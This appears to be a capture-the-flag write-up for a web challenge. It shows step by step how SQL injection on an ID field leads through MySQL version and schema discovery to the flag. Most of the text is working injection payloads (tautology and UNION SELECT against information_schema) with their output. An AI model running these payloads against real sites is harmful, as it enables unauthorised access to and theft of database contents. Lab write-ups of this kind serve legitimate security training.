Web - 30

First we have to know if the site is vulnerable to SQL Injection and if the database is PostgreSQL, MySQL etc.
Inserting admin' on the ID field, we get the message "You have an error in your SQL syntax; check the manual 
that corresponds to your MySQL server version for the right syntax to use near ''admin'' Limit 1' at line 1".

Using the SQL Injection ' OR '1' = 1#' on the ID field of the site, we get

First name:Harry
Surname: Potter

First name:Hermione
Surname: Granger

First name:Ronald
Surname: Weasley

First name:Joker
Surname: Joker

Now we know that we have two columns. We can discover the DB version inserting the command 'UNION ALL SELECT @@version,2#

First name:5.5.54-0+deb8u1
Surname: 2

Current database name: ' UNION ALL SELECT database(),2#' : hack

Now we can discover the table names of the 'hack' database:

' UNION ALL SELECT table_schema, table_name FROM information_schema.columns WHERE table_schema = 'hack'#'

First name:hack
Surname: CIA_Official_Records

First name:hack
Surname: CIA_Official_Records

First name:hack
Surname: CIA_Official_Records

First name:hack
Surname: CIA_Official_Records

First name:hack
Surname: Joker

First name:hack
Surname: Joker

To get the column names of the Joker table, we insert on the ID field
' UNION ALL SELECT column_name, table_name FROM information_schema.columns WHERE table_name = 'Joker'#'

First name:Flag
Surname: Joker

First name:HaHaHa
Surname: Joker

And finally we can find the flag now, inserting 
' UNION ALL SELECT Flag, HaHaHa FROM Joker#'

First name:BITSCTF{wh4t_d03snt_k1ll_y0u_s1mply_m4k3s_y0u_str4ng3r!}
Surname: Enjoying the game Batman!!!
